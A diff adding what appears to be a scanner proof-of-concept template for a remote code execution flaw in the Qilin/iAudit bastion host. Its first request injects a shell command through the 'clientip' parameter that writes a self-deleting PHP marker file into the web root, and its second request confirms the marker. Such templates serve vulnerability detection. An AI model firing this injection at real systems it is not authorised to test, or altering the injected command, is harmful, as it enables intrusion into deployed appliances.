@@ -1,0 +1,19 @@
+name: poc-yaml-qilin-bastion-host-rce
+set:
+  r2: randomLowercase(10)
+rules:
+  - method: GET
+    path: /get_luser_by_sshport.php?clientip=1;echo%20"<?php%20echo%20md5({{r2}});unlink(__FILE__);?>">/opt/freesvr/web/htdocs/freesvr/audit/{{r2}}.php;&clientport=1
+    follow_redirects: false
+    expression: response.status == 200
+
+  - method: GET
+    path: /{{r2}}.php
+    follow_redirects: false
+    expression: response.status == 200 && response.body.bcontains(bytes(md5(r2)))
+
+detail:
+  author: For3stCo1d (https://github.com/For3stCo1d)
+  description: "iAudit-fortressaircraft-rce"
+  links:
+    - https://yun.scdsjzx.cn/system/notice/detail/399d2dd0-94aa-4914-a8f6-e71f8dc8ac87
